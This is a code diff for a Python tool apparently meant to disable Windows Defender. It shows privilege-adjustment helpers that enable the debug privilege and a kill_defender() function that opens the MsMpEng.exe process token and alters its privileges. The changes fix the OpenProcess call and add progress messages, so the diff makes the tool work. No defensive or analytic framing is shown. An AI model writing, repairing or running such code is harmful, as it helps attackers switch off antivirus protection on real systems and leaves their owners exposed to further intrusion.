@@ -61,7 +61,7 @@ def adjust_privilege_a(priv, enable=1):
 def adjust_privilege_b(priv, pid, enable=1):
     # Get the process token
     flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
-    proc_handle = win32security.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
+    proc_handle = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
     htoken = win32security.OpenProcessToken(proc_handle, flags)
     # Get the ID for specified privilege
     id = win32security.LookupPrivilegeValue(None, priv)
@@ -74,7 +74,9 @@ def adjust_privilege_b(priv, pid, enable=1):
     win32security.AdjustTokenPrivileges(htoken, 0, new_privileges)
 
 def enable_debug_privilege():
+    print("Enabling debug privileges")
     adjust_privilege_a(SE_DEBUG_NAME)
+    print("Debug privileges enabled")
 
 def get_all_processes():
     c = wmi.WMI(find_classes=False)
@@ -117,7 +119,7 @@ def kill_defender():
     ]
     pid = get_pid("MsMpEng.exe")
     flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
-    proc_handle = win32security.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
+    proc_handle = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
     htoken = win32security.OpenProcessToken(proc_handle, flags)
     for priv in privs:
         id = win32security.LookupPrivilegeValue(None, priv)
